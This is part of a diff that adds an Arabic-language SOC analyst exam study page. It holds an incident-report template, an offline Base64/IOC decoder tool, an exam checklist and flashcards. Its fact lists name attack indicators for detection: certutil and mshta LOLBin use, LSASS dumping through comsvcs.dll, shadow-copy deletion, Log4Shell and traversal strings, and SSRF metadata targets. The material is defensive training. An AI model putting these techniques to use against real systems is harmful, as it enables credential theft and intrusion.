+   Recipients: 23 | Clicked: 3 | Submitted creds: 1 | Data accessed: mailbox (under review)
+
+7. ACTIONS TAKEN (Containment / Eradication / Recovery)
+   - Purged email from all mailboxes; blocked sender domains, URL, IPs
+   - Revoked sessions, reset password, re-registered MFA for affected user; removed inbox rule
+
+8. RECOMMENDATIONS
+   Immediate : Warn external contacts who received fraudulent emails
+   Short-term: Conditional Access (compliant device), phishing-resistant MFA (FIDO2), block newly-registered domains
+   Long-term : Awareness training, external-sender banner, detection rule for suspicious inbox rules</pre>
+</section>
+
+<!-- ===================== TOOLS ===================== -->
+<section class="sec" id="tools">
+<header><h2><span class="num">20</span>أداة Decode + IOC Extractor (شغالة Offline)</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+<p>"Mini CyberChef" جوه الملف: الصق أي نص واختار العملية. كل حاجة بتحصل في المتصفح بتاعك (مفيش أي حاجة بتتبعت لأي مكان).</p>
+<textarea class="tool" id="tin" placeholder="Paste here... e.g. SQBFAFgAIAAoAE4AZQB3AC0A..."></textarea>
+<div class="toolbar">
+  <button class="btn primary" data-op="b64u16">Base64 → UTF-16LE (PowerShell -enc)</button>
+  <button class="btn primary" data-op="b64">Base64 → Text</button>
+  <button class="btn" data-op="url">URL Decode (recursive)</button>
+  <button class="btn" data-op="hex">Hex → Text</button>
+  <button class="btn" data-op="html">HTML Entities</button>
+  <button class="btn" data-op="rot13">ROT13</button>
+  <button class="btn" data-op="tob64">Text → Base64</button>
+  <button class="btn" data-op="defang">Defang</button>
+  <button class="btn" data-op="refang">Refang</button>
+  <button class="btn" data-op="ioc">🔎 Extract IOCs</button>
+  <button class="btn" data-op="swap">⇅ Output → Input</button>
+</div>
+<textarea class="tool" id="tout" readonly placeholder="Output"></textarea>
+
+<h3>مواقع وأدوات لازم تكون عارفها بالاسم</h3>
+<div class="grid3">
+<div class="card"><h4>Reputation / TI</h4><ul><li>VirusTotal</li><li>AbuseIPDB</li><li>urlscan.io</li><li>Cisco Talos</li><li>AlienVault OTX</li><li>GreyNoise / Shodan</li><li>URLhaus / MalwareBazaar / ThreatFox</li></ul></div>
+<div class="card"><h4>Analysis</h4><ul><li>CyberChef</li><li>any.run / Joe Sandbox / Hybrid Analysis</li><li>oletools (olevba)، pdfid</li><li>PEStudio، FLOSS، Detect It Easy</li><li>Wireshark / NetworkMiner / Zeek</li><li>Sysinternals: Procmon، Process Explorer، Autoruns</li></ul></div>
+<div class="card"><h4>Platforms</h4><ul><li>SIEM: Splunk، Sentinel، QRadar، Elastic، Wazuh</li><li>EDR: Defender، CrowdStrike، SentinelOne</li><li>SOAR: Cortex XSOAR، Splunk SOAR</li><li>Forensics: KAPE، Velociraptor، Volatility، Autopsy</li><li>Training: LetsDefend، CyberDefenders، TryHackMe، BTLO</li></ul></div>
+</div>
+</section>
+
+<!-- ===================== FINAL ===================== -->
+<section class="sec" id="final">
+<header><h2><span class="num">21</span>Checklist ليلة الامتحان + أثناء الامتحان</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<div class="grid2">
+<div class="card"><h4>🌙 الليلة دي</h4><ul>
+<li>حل الـ Labs كلها من غير ما تبص على الإجابة (ساعة).</li>
+<li>Flashcards: Ports + Event IDs + Logon Types (20 دقيقة).</li>
+<li>اكتب بإيدك Report واحد كامل من Template (15 دقيقة).</li>
+<li>راجع SPF/DKIM/DMARC + "Pass ≠ Safe".</li>
+<li>جهّز tabs: CyberChef، VirusTotal، urlscan، AbuseIPDB، MXToolbox (لو مسموح).</li>
+<li><b>نام كويس</b> — التحليل محتاج دماغ صاحية أكتر من الحفظ.</li></ul></div>
+<div class="card"><h4>📝 أثناء الـ Assessment</h4><ul>
+<li>اقرأ السؤال كله الأول وحدد المطلوب بالظبط (Verdict؟ IOCs؟ Timeline؟).</li>
+<li>ابدأ باللي واثق منه، ووزّع الوقت.</li>
+<li>حوّل الـ timestamps لـ timezone واحد.</li>
+<li>اكتب بالهيكل: Summary → Evidence → IOCs → MITRE → Verdict → Actions.</li>
+<li>Defang كل IOC.</li>
+<li>لو مش متأكد: اكتب الاحتمالات والدليل اللي يحسم كل واحد ("لو X يبقى FP، لو Y يبقى TP") — ده بيبيّن تفكير ناضج.</li>
+<li>اربط الأسئلة ببعض — غالباً الـ IPs والـ users بيتكرروا بين الأسئلة!</li></ul></div>
+</div>
+
+<h3>🔥 أهم 30 معلومة لو مش هتفتكر غيرهم</h3>
+<div class="grid2">
+<ol>
+<li>4624 نجاح / 4625 فشل / 4672 admin logon</li>
+<li>Logon Type 3 Network، 10 RDP، 2 Interactive، 9 NewCredentials (PtH)</li>
+<li>0xC000006A باسورد غلط ليوزر صح / 0xC0000064 يوزر مش موجود</li>
+<li>4720 user created / 4732 added to local admins / 4728 global group</li>
+<li>7045 service installed / 4698 scheduled task / 1102 log cleared</li>
+<li>4769 + 0x17 = Kerberoasting / 4662 + replication GUID = DCSync</li>
+<li>4104 = PowerShell script block (الكود بعد الفك)</li>
+<li>Sysmon 1 process، 3 network، 10 process access (lsass)، 22 DNS</li>
+<li>lsass parent = wininit / svchost parent = services.exe</li>
+<li>Office → PowerShell/cmd = Macro malware</li>
+<li>w3wp/httpd/java → cmd/sh = Web shell</li>
+<li>vssadmin delete shadows = Ransomware قرب</li>
+<li>comsvcs.dll MiniDump = LSASS dump</li>
+<li>certutil -urlcache / bitsadmin / mshta / regsvr32 = LOLBins</li>
+<li>Base64 UTF-16LE: SQBFAFgA = IEX، JAB = $، TVqQ = MZ (exe)</li>
+</ol>
+<ol start="16">
+<li>Received headers تتقري من تحت لفوق</li>
+<li>SPF على Return-Path، DMARC على From (alignment)</li>
+<li>SPF/DKIM/DMARC pass ≠ آمن</li>
+<li>Reply-To ≠ From = 🚩 (BEC)</li>
+<li>POST + 302 بعد صفحة phishing = credentials اتبعتت</li>
+<li>Beaconing = intervals منتظمة + نفس الحجم + rare destination</li>
+<li>bytes_out ضخم لبرا بالليل = Exfil</li>
+<li>Src واحد → ports كتير = vertical scan / → hosts كتير = sweep</li>
+<li>Brute force = يوزر واحد كتير / Spraying = يوزرات كتير مرة</li>
+<li>SQLi: ' → 500 ثم UNION → response size أكبر = نجاح</li>
+<li>../../etc/passwd = Traversal/LFI / 169.254.169.254 = SSRF</li>
+<li>${jndi:ldap://} = Log4Shell</li>
+<li>Long random subdomains + TXT = DNS tunneling / NXDOMAIN كتير = DGA</li>
+<li>Reset password لوحده مش كفاية — Revoke sessions!</li>
+<li>Isolate مش Shutdown (حافظ على الـ memory evidence)</li>
+</ol>
+</div>
+
+<div class="callout tip"><b class="t">💪 آخر كلمة</b>
+الـ Assessment مش بيدوّر على حد حافظ كل حاجة — بيدوّر على حد <b>منظّم، فضولي، وبيبني كلامه على دليل</b>. لو اتبعت المنهجية وكتبت بهيكل واضح هتتميز. بالتوفيق بكرة 🛡️
+</div>
+</section>
+
+<p style="text-align:center;color:var(--muted);font-size:13px;margin-top:30px">كل الـ IPs (192.0.2.x / 198.51.100.x / 203.0.113.x) والدومينات في الملف أمثلة تعليمية وهمية.</p>
+</main>
+</div>
+
+<script>
+(function(){
+  var root = document.documentElement;
+  function sget(k){ try { return localStorage.getItem(k); } catch(e){ return null; } }
+  function sset(k,v){ try { localStorage.setItem(k,v); } catch(e){} }
+
+  /* Theme */
+  var t = sget('soc-theme'); if (t) root.setAttribute('data-theme', t);
+  document.getElementById('theme').onclick = function(){
+    var cur = root.getAttribute('data-theme');
+    if (!cur) cur = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    var nx = cur === 'dark' ? 'light' : 'dark';
+    root.setAttribute('data-theme', nx); sset('soc-theme', nx);
+  };
+
+  /* Mobile menu */
+  var side = document.getElementById('side');
+  document.getElementById('menu').onclick = function(){ side.classList.toggle('open'); };
+  side.addEventListener('click', function(e){ if (e.target.closest('.toc a')) side.classList.remove('open'); });
+
+  /* Progress */
+  var secs = Array.prototype.slice.call(document.querySelectorAll('section.sec'));
+  var done = {}; try { done = JSON.parse(sget('soc-done') || '{}') || {}; } catch(e){ done = {}; }
+  function tocLink(id){ return document.querySelector('.toc a[href="#'+id+'"]'); }
+  function refresh(){
+    var n = 0;
+    secs.forEach(function(s){ var a = tocLink(s.id); var d = !!done[s.id]; if (d) n++; if (a) a.classList.toggle('done', d); });
+    var p = Math.round(n / secs.length * 100);
+    document.getElementById('progbar').style.width = p + '%';
+    document.getElementById('progtxt').textContent = 'التقدّم: ' + p + '% (' + n + '/' + secs.length + ')';
+  }
+  secs.forEach(function(s){
+    var cb = s.querySelector('.donebox input'); if (!cb) return;
+    cb.checked = !!done[s.id];
+    cb.onchange = function(){ done[s.id] = cb.checked; sset('soc-done', JSON.stringify(done)); refresh(); };
+  });
+  refresh();
+
+  /* Active TOC on scroll */
+  if ('IntersectionObserver' in window){
+    var io = new IntersectionObserver(function(es){
+      es.forEach(function(en){ if (en.isIntersecting){
+        document.querySelectorAll('.toc a.active').forEach(function(a){ a.classList.remove('active'); });
+        var a = tocLink(en.target.id); if (a) a.classList.add('active');
+      }});
+    }, { rootMargin: '-20% 0px -70% 0px' });
+    secs.forEach(function(s){ io.observe(s); });
+  }
+
+  /* Search */
+  var q = document.getElementById('q'), hero = document.querySelector('.hero');
+  q.addEventListener('input', function(){
+    var v = q.value.trim().toLowerCase();
+    secs.forEach(function(s){
+      var hit = !v || s.textContent.toLowerCase().indexOf(v) !== -1;
+      s.classList.toggle('hidden-by-search', !hit);
+      var a = tocLink(s.id); if (a) a.parentNode.classList.toggle('hidden-by-search', !hit);
+      if (v && hit) s.querySelectorAll('details').forEach(function(d){ if (d.textContent.toLowerCase().indexOf(v) !== -1) d.open = true; });
+    });
+    hero.classList.toggle('hidden-by-search', !!v);
+  });
+
+  /* Expand all answers */
+  var expanded = false;
+  document.getElementById('expand').onclick = function(){
+    expanded = !expanded;
+    document.querySelectorAll('details').forEach(function(d){ d.open = expanded; });
+    this.textContent = expanded ? '📕 اقفل الإجابات' : '📖 افتح الإجابات';
+  };
+
+  /* Copy buttons */
+  document.querySelectorAll('pre').forEach(function(pre){
+    var b = document.createElement('button'); b.className = 'copy'; b.type = 'button'; b.textContent = 'نسخ';
+    b.onclick = function(){
+      var clone = pre.cloneNode(true); var cb = clone.querySelector('.copy'); if (cb) cb.remove(); var txt = clone.textContent;
+      var ok = function(){ b.textContent = '✓ اتنسخ'; setTimeout(function(){ b.textContent = 'نسخ'; }, 1200); };
+      if (navigator.clipboard) navigator.clipboard.writeText(txt).then(ok, function(){});
+    };
+    pre.appendChild(b);
+  });
+
+  /* Flashcards */
+  var CARDS = [
+    ['Ports','21','FTP'],['Ports','22','SSH / SFTP'],['Ports','23','Telnet'],['Ports','25','SMTP'],['Ports','53','DNS (UDP/TCP)'],
+    ['Ports','67/68','DHCP'],['Ports','80','HTTP'],['Ports','88','Kerberos'],['Ports','110','POP3'],['Ports','123','NTP'],
+    ['Ports','135','MS-RPC (WMI/DCOM)'],['Ports','137-139','NetBIOS'],['Ports','143','IMAP'],['Ports','161','SNMP'],['Ports','389','LDAP'],
+    ['Ports','443','HTTPS'],['Ports','445','SMB'],['Ports','587','SMTP Submission'],['Ports','636','LDAPS'],['Ports','993','IMAPS'],
+    ['Ports','1433','MSSQL'],['Ports','3306','MySQL'],['Ports','3389','RDP'],['Ports','4444','Metasploit default'],['Ports','5432','PostgreSQL'],
+    ['Ports','5985/5986','WinRM HTTP/HTTPS'],['Ports','6379','Redis'],['Ports','8080','HTTP-alt / Proxy'],['Ports','514','Syslog'],
+    ['Event IDs','4624','Successful logon'],['Event IDs','4625','Failed logon'],['Event IDs','4634','Logoff'],['Event IDs','4648','Logon with explicit credentials (RunAs)'],
+    ['Event IDs','4672','Special privileges assigned (admin logon)'],['Event IDs','4688','Process creation'],['Event IDs','4697','Service installed (Security log)'],
+    ['Event IDs','7045','Service installed (System log)'],['Event IDs','4698','Scheduled task created'],['Event IDs','4720','User account created'],
+    ['Event IDs','4724','Password reset attempt by another account'],['Event IDs','4728','Member added to global security group'],['Event IDs','4732','Member added to local security group (Administrators)'],
+    ['Event IDs','4756','Member added to universal security group'],['Event IDs','4740','Account locked out'],['Event IDs','4768','Kerberos TGT requested'],
+    ['Event IDs','4769','Kerberos service ticket requested (0x17 = Kerberoasting)'],['Event IDs','4771','Kerberos pre-auth failed'],['Event IDs','4776','NTLM credential validation'],
+    ['Event IDs','4662','Operation on AD object (DCSync)'],['Event IDs','5140','Network share accessed'],['Event IDs','5145','Detailed file share access check'],
+    ['Event IDs','1102','Security audit log cleared'],['Event IDs','104','System log cleared'],['Event IDs','4104','PowerShell Script Block Logging'],
+    ['Logon Types','Type 2','Interactive (keyboard)'],['Logon Types','Type 3','Network (SMB, net use)'],['Logon Types','Type 4','Batch (scheduled task)'],
+    ['Logon Types','Type 5','Service'],['Logon Types','Type 7','Unlock'],['Logon Types','Type 8','NetworkCleartext'],['Logon Types','Type 9','NewCredentials (runas /netonly, PtH)'],
+    ['Logon Types','Type 10','RemoteInteractive (RDP)'],['Logon Types','Type 11','CachedInteractive'],
+    ['Status Codes','0xC000006A','Correct user, wrong password'],['Status Codes','0xC0000064','User does not exist'],['Status Codes','0xC0000234','Account locked out'],
+    ['Status Codes','0xC0000072','Account disabled'],['Status Codes','0xC0000071','Password expired'],
+    ['Sysmon','Sysmon 1','Process Create'],['Sysmon','Sysmon 3','Network Connection'],['Sysmon','Sysmon 7','Image (DLL) Loaded'],['Sysmon','Sysmon 8','CreateRemoteThread (injection)'],
+    ['Sysmon','Sysmon 10','Process Access (LSASS!)'],['Sysmon','Sysmon 11','File Create'],['Sysmon','Sysmon 13','Registry Value Set'],['Sysmon','Sysmon 17/18','Named Pipe Created / Connected'],
+    ['Sysmon','Sysmon 22','DNS Query'],
+    ['MITRE','T1566','Phishing (.001 attachment, .002 link)'],['MITRE','T1059.001','PowerShell'],['MITRE','T1053.005','Scheduled Task'],['MITRE','T1547.001','Registry Run Keys / Startup Folder'],
+    ['MITRE','T1003.001','LSASS Memory dumping'],['MITRE','T1110.003','Password Spraying'],['MITRE','T1021.001','Remote Desktop Protocol'],['MITRE','T1021.002','SMB / Windows Admin Shares'],
+    ['MITRE','T1071.001','C2 over Web Protocols'],['MITRE','T1071.004','C2 over DNS'],['MITRE','T1105','Ingress Tool Transfer'],['MITRE','T1486','Data Encrypted for Impact (Ransomware)'],
+    ['MITRE','T1490','Inhibit System Recovery (shadow copies)'],['MITRE','T1190','Exploit Public-Facing Application'],['MITRE','T1505.003','Web Shell'],
+    ['MITRE','T1558.003','Kerberoasting'],['MITRE','T1550.002','Pass the Hash'],['MITRE','T1070.001','Clear Windows Event Logs'],['MITRE','T1078','Valid Accounts'],['MITRE','T1218.011','Rundll32'],
+    ['HTTP','200','OK'],['HTTP','301 / 302','Moved Permanently / Found (redirect)'],['HTTP','304','Not Modified'],['HTTP','401','Unauthorized (not authenticated)'],
+    ['HTTP','403','Forbidden (no permission)'],['HTTP','404','Not Found'],['HTTP','405','Method Not Allowed'],['HTTP','429','Too Many Requests'],['HTTP','500','Internal Server Error'],['HTTP','503','Service Unavailable'],
+    ['Patterns','SQBFAFgA','IEX (Base64 UTF-16LE)'],['Patterns','TVqQ','MZ header — Base64 of a Windows EXE'],['Patterns','H4sI','Gzip (Base64)'],['Patterns','JAB','$ variable (Base64 UTF-16LE)'],
+    ['Patterns','rO0AB','Java serialized object (Base64)'],['Patterns','${jndi:ldap://','Log4Shell'],['Patterns','169.254.169.254','Cloud metadata (SSRF target)'],
+    ['Patterns','xn--','Punycode (IDN homograph domain)'],['Patterns','%252e%252e%252f','Double-encoded ../'],
+    ['Email','SPF','Authorized sending IPs — checks Return-Path domain'],['Email','DKIM','Cryptographic signature — d= domain, selector in DNS'],
+    ['Email','DMARC','Policy + alignment with From (none/quarantine/reject)'],['Email','Return-Path','Envelope sender (MAIL FROM), bounces go here'],
+    ['Email','Received (bottom)','First hop — originating server/IP']
+  ];
+  var sel = document.getElementById('fcCat'), cats = [];
+  CARDS.forEach(function(c){ if (cats.indexOf(c[0]) === -1) cats.push(c[0]); });
+  cats.forEach(function(c){ var o = document.createElement('option'); o.value = c; o.textContent = c; sel.appendChild(o); });
+  var deck = CARDS.slice(), i = 0, fc = document.getElementById('fc');
+  function filt(){ deck = CARDS.filter(function(c){ return sel.value === 'all' || c[0] === sel.value; }); i = 0; show(); }
+  function show(){
+    if (!deck.length) return; var c = deck[i];
+    fc.classList.remove('show');
+    document.getElementById('fcC').textContent = c[0];
+    document.getElementById('fcQ').textContent = c[1];
+    document.getElementById('fcA').textContent = c[2];
+    document.getElementById('fcCount').textContent = (i+1) + ' / ' + deck.length;
+  }
+  function next(d){ i = (i + d + deck.length) % deck.length; show(); }
+  fc.onclick = function(){ fc.classList.toggle('show'); };
+  fc.onkeydown = function(e){
+    if (e.key === ' ' || e.key === 'Enter'){ e.preventDefault(); fc.classList.toggle('show'); }
+    else if (e.key === 'ArrowLeft'){ next(1); } else if (e.key === 'ArrowRight'){ next(-1); }
+  };
+  document.getElementById('fcNext').onclick = function(){ next(1); };
+  document.getElementById('fcPrev').onclick = function(){ next(-1); };
+  document.getElementById('fcShuffle').onclick = function(){
+    for (var k = deck.length - 1; k > 0; k--){ var j = Math.floor(Math.random() * (k+1)); var tmp = deck[k]; deck[k] = deck[j]; deck[j] = tmp; }
+    i = 0; show();
+  };
+  sel.onchange = filt; show();
+
+  /* Decoder tool */
+  var tin = document.getElementById('tin'), tout = document.getElementById('tout');
+  function b64bytes(s){
+    s = s.replace(/\s+/g,'').replace(/-/g,'+').replace(/_/g,'/');
+    while (s.length % 4) s += '=';
+    var bin = atob(s), u = new Uint8Array(bin.length);
+    for (var k = 0; k < bin.length; k++) u[k] = bin.charCodeAt(k);
+    return u;
+  }
+  function extractB64(s){ var m = s.match(/[A-Za-z0-9+\/_-]{16,}={0,2}/g); if (!m) return s; return m.sort(function(a,b){ return b.length - a.length; })[0]; }
+  var OPS = {
+    b64u16: function(s){ return new TextDecoder('utf-16le').decode(b64bytes(extractB64(s))); },
+    b64: function(s){ return new TextDecoder('utf-8').decode(b64bytes(extractB64(s))); },
+    url: function(s){ var prev, cur = s, n = 0; do { prev = cur; try { cur = decodeURIComponent(cur.replace(/\+/g,' ')); } catch(e){ break; } n++; } while (cur !== prev && n < 5); return cur; },
+    hex: function(s){ var h = s.replace(/0x|\\x|[^0-9a-fA-F]/g,''); var u = new Uint8Array(h.length/2|0); for (var k=0;k<u.length;k++) u[k]=parseInt(h.substr(k*2,2),16); return new TextDecoder('utf-8').decode(u); },
+    html: function(s){ var ta = document.createElement('textarea'); ta.innerHTML = s; return ta.value; },
+    rot13: function(s){ return s.replace(/[a-zA-Z]/g, function(c){ var b = c <= 'Z' ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - b + 13) % 26 + b); }); },
+    tob64: function(s){ var u = new TextEncoder().encode(s), bin = ''; u.forEach(function(x){ bin += String.fromCharCode(x); }); return btoa(bin); },
+    defang: function(s){ return s.replace(/http/gi, function(m){ return m[0] === 'H' ? 'HXXP' : 'hxxp'; }).replace(/:\/\//g,'[://]').replace(/\./g,'[.]').replace(/@/g,'[@]'); },
+    refang: function(s){ return s.replace(/hxxp/gi,'http').replace(/\[:\/\/\]/g,'://').replace(/\[\.\]|\(\.\)|\{\.\}/g,'.').replace(/\[@\]/g,'@'); },
+    ioc: function(s){
+      s = OPS.refang(s);
+      var fileExt = /\.(exe|dll|php|ps1|js|vbs|docm|xlsm|zip|iso|lnk|html?|txt|sh|py|bat|jpg|png|aspx|jsp|dmp|hta|sct)$/i;
+      function uniq(a){ return (a||[]).filter(function(x,k,arr){ return arr.indexOf(x) === k; }); }
+      var urls = uniq(s.match(/https?:\/\/[^\s"'<>]+/gi));
+      var ips = uniq(s.match(/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g));
+      var emails = uniq(s.match(/[\w.+-]+@[\w-]+(?:\.[\w-]+)+/g));
+      var sha256 = uniq(s.match(/\b[a-fA-F0-9]{64}\b/g)), sha1 = uniq(s.match(/\b[a-fA-F0-9]{40}\b/g)), md5 = uniq(s.match(/\b[a-fA-F0-9]{32}\b/g));
+      var doms = uniq((s.match(/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z][a-z0-9-]{1,22}\b/gi)||[]).map(function(d){ return d.toLowerCase(); }))
+        .filter(function(d){ return !fileExt.test(d) && !/^\d+(\.\d+)+$/.test(d); });
+      var out = [];
+      function add(t, a){ if (a.length) out.push('## ' + t + ' (' + a.length + ')\n' + a.join('\n')); }
+      add('URLs', urls); add('IPs', ips); add('Domains', doms); add('Emails', emails); add('SHA256', sha256); add('SHA1', sha1); add('MD5', md5);
+      return out.length ? out.join('\n\n') + '\n\n## Defanged\n' + OPS.defang(urls.concat(ips, doms).join('\n')) : 'No IOCs found.';
+    }
+  };
+  document.querySelectorAll('[data-op]').forEach(function(b){
+    b.onclick = function(){
+      var op = b.getAttribute('data-op');
+      if (op === 'swap'){ tin.value = tout.value; tout.value = ''; return; }
+      try { tout.value = OPS[op](tin.value); } catch(e){ tout.value = '⚠️ Error: ' + e.message + '\n(تأكد إن الـ input صحيح للعملية دي)'; }
+    };
+  });
+})();
+</script>
+</body>
+</html>
